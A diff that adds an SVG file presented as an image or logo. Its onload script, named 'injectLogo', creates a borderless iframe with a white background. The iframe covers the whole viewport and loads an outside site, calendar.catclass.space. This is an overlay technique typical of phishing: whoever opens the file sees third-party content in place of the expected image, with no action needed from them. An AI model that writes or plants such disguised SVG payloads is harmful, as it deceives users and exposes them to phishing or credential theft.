@@ -1,0 +1,15 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position:absolute;top:0;left:0;overflow:hidden;" onload="injectLogo()">
+  <script type="text/javascript"><![CDATA[
+    function injectLogo() {
+      const c = document.getElementById('lc');
+      if (!c) return;
+      const f = document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
+      f.setAttribute('src','https://calendar.catclass.space/');
+      f.style.cssText='width:100%;height:100%;border:none;background:white;margin:0;padding:0;';
+      c.appendChild(f);
+    }
+  ]]></script>
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <xhtml:div xmlns:xhtml="http://www.w3.org/1999/xhtml" id="lc" style="width:100%;height:100%;margin:0;padding:0;overflow:hidden;"></xhtml:div>
+  </foreignObject>
+</svg>
